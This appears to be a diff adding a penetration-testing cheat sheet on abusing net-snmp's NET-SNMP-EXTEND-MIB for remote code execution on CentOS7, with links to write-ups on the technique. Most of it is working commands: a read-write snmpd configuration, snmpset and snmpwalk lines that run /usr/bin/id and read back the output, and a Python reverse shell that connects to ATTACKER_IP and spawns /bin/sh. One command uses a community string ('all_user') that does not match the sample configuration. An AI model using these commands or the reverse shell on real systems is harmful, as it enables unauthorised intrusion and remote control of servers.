@@ -1,0 +1,53 @@
+Tested on CentOS7
+----------------------
+* https://digi.ninja/blog/snmp_to_shell.php
+* https://medium.com/rangeforce/snmp-arbitrary-command-execution-19a6088c888e
+* https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce
+* https://bestmonitoringtools.com/mibdb/mibdb_search.php?mib=NET-SNMP-EXTEND-MIB
+
+Server setup
+-------------
+NOTES:
+	- On a default install, the community "public" is enabled and is Read Only
+	- You can get remote code execution on snmpd if you have access to a read-write community string and
+	  if NET-SNMP-EXTEND-MIB is loaded (installed by net-snmp-libs)
+
+SNMP Install:
+	yum -y install net-snmp net-snmp-utils
+	systemctl restart snmpd
+
+Sample /etc/snmp/snmpd.conf:
+	#       sec.name   source    community
+	com2sec rw_user    default    rw_community
+	#                  sec.model       sec.name
+	group   rw_group    v2c             rw_user
+	#                 incl/excl       subtree
+	view    all        included        .1
+	#                  context  model   level   prefix  read  write  notify
+	access  rw_group   ""        any    noauth  exact   all   all     none
+
+Client Test:
+	snmpwalk -v 2c -c rw_community <snmpd.ip.address>
+
+
+Command Set:
+	snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c all_user <snmpd.ip.address> 'nsExtendStatus."cmd"' = createAndGo 'nsExtendCommand."cmd"' = /usr/bin/id 'nsExtendArgs."cmd"' = '"-a"'
+
+Command Execute:
+	snmpwalk -v 2c -c rw_community <snmpd.ip.address> nsExtendOutput2
+	  or
+	snmpwalk -v 2c -c rw_community <snmpd.ip.address> nsExtendOutput1
+	  or
+	snmpwalk -v 2c -c rw_community <snmpd.ip.address> nsExtendObjects
+
+Remove Command:
+	snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c rw_community <snmpd.ip.address> 'nsExtendStatus."cmd"' = destroy
+
+Reverse Shell:
+  * This only works if SELinux is disabled or misconfigured
+
+	snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c rw_community <snmpd.ip.address> \
+		'nsExtendStatus."cmd"' = createAndGo \
+		'nsExtendCommand."cmd"' = /usr/bin/python \
+		'nsExtendArgs."cmd"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"ATTACKER_IP\",ATTACKER_PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
+
